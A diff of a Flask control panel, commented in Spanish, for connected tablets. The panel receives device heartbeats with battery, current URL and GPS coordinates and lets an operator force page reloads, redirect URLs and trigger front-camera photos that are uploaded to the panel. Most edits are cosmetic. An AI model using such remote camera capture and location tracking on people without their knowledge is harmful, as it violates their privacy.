@@ -4,7 +4,7 @@ from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
-# Memoria para almacenar múltiples dispositivos por su ID
+# Memoria temporal para almacenar las tabletas conectadas
 devices_db = {}
 
 HTML_TEMPLATE = """
@@ -23,7 +23,7 @@ HTML_TEMPLATE = """
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
         .card { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-top: 4px solid #007bff; }
         .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        .card h3 { margin: 0; color: #007bff; }
+        .card h3 { margin: 0; color: #007bff; font-size: 18px; }
         .header-btns { display: flex; gap: 5px; }
         .info-group { margin-bottom: 12px; font-size: 14px; }
         .info-group label { font-weight: bold; color: #666; display: block; margin-bottom: 2px; }
@@ -33,7 +33,7 @@ HTML_TEMPLATE = """
         .url-input { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 13px; }
         .btn { background: #007bff; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 13px; text-decoration: none; }
         .btn:hover { background: #0056b3; }
-        .btn-reload { background: #6c757d; }
+        .btn-reload-panel { background: #6c757d; }
         .btn-action { background: #ffc107; color: #212529; font-size: 12px; padding: 6px 10px; border-radius: 4px; border: none; cursor: pointer; font-weight: bold; }
         .btn-action:hover { background: #e0a800; }
         .btn-camera { background: #17a2b8; color: white; }
@@ -41,7 +41,7 @@ HTML_TEMPLATE = """
         .map-link { color: #007bff; text-decoration: none; font-weight: bold; }
         .map-link:hover { text-decoration: underline; }
         .empty-state { background: white; padding: 40px; text-align: center; border-radius: 10px; color: #777; }
-        .captured-photo { width: 100%; max-height: 200px; object-fit: cover; border-radius: 6px; margin-top: 8px; border: 1px solid #ddd; }
+        .captured-photo { width: 100%; max-height: 220px; object-fit: cover; border-radius: 6px; margin-top: 8px; border: 1px solid #ddd; }
     </style>
 </head>
 <body>
@@ -53,7 +53,7 @@ HTML_TEMPLATE = """
             </div>
             <div>
                 <span class="status-badge">En Línea (Render)</span>
-                <a href="/" class="btn btn-reload" style="margin-left: 10px;">🔄 Refrescar Panel</a>
+                <a href="/" class="btn btn-reload-panel" style="margin-left: 10px;">🔄 Refrescar Panel</a>
             </div>
         </div>
 
@@ -68,7 +68,7 @@ HTML_TEMPLATE = """
                         <div class="header-btns">
                             <form action="/reload_device" method="POST" style="margin: 0; display: inline;">
                                 <input type="hidden" name="device_id" value="{{ device_id }}">
-                                <button type="submit" class="btn-action" title="Forzar recarga del sitio en la tableta">🔄 Recargar</button>
+                                <button type="submit" class="btn-action" title="Forzar recarga de la página en la tableta">🔄 Recargar</button>
                             </form>
                             <form action="/capture_camera" method="POST" style="margin: 0; display: inline;">
                                 <input type="hidden" name="device_id" value="{{ device_id }}">
@@ -107,7 +107,7 @@ HTML_TEMPLATE = """
 
                     {% if info.get('last_image') %}
                     <div class="info-group">
-                        <label>Última Captura Recibida (Frontal):</label>
+                        <label>Última Captura Recibida (Cámara Frontal):</label>
                         <img src="data:image/jpeg;base64,{{ info.last_image }}" class="captured-photo" alt="Captura remota cámara frontal">
                     </div>
                     {% endif %}
@@ -142,6 +142,7 @@ def heartbeat():
     if not device_id:
         return jsonify({'status': 'error', 'message': 'device_id missing'}), 400
 
+    # Inicializar registro si es un nuevo dispositivo
     if device_id not in devices_db:
         devices_db[device_id] = {
             'target_url': None,
@@ -150,6 +151,7 @@ def heartbeat():
             'last_image': None
         }
 
+    # Actualizar estado actual enviado por la tableta
     devices_db[device_id]['device_name'] = data.get('device_name', 'Tableta Desconocida')
     devices_db[device_id]['battery'] = data.get('battery', 0)
     devices_db[device_id]['current_url'] = data.get('current_url', 'N/A')
@@ -157,19 +159,19 @@ def heartbeat():
     devices_db[device_id]['longitude'] = data.get('longitude')
 
     response_data = {'status': 'ok'}
-    
-    # Comando para tomar foto frontal si se presionó el botón 📸 Foto Frontal
-    if devices_db[device_id].get('capture_image'):
-        response_data['capture_image'] = True
-        response_data['camera_facing'] = 'front'  # Especifica la cámara frontal
-        devices_db[device_id]['capture_image'] = False
 
-    # Comando para recargar página
+    # 1. Instrucción para recargar la página actual
     if devices_db[device_id].get('should_reload'):
         response_data['reload_page'] = True
         devices_db[device_id]['should_reload'] = False
 
-    # Comando para cambiar URL
+    # 2. Instrucción para capturar foto con la cámara frontal
+    if devices_db[device_id].get('capture_image'):
+        response_data['capture_image'] = True
+        response_data['camera_facing'] = 'front'
+        devices_db[device_id]['capture_image'] = False
+
+    # 3. Instrucción para cambiar la URL cargada
     if devices_db[device_id].get('target_url'):
         response_data['url'] = devices_db[device_id]['target_url']
         devices_db[device_id]['target_url'] = None
@@ -184,7 +186,6 @@ def upload_image():
 
     if device_id in devices_db and image_data:
         devices_db[device_id]['last_image'] = image_data
-        print(f"¡Foto frontal remota recibida con éxito del dispositivo {device_id}!")
         return jsonify({'status': 'photo_received'}), 200
 
     return jsonify({'status': 'no_image_or_device'}), 400
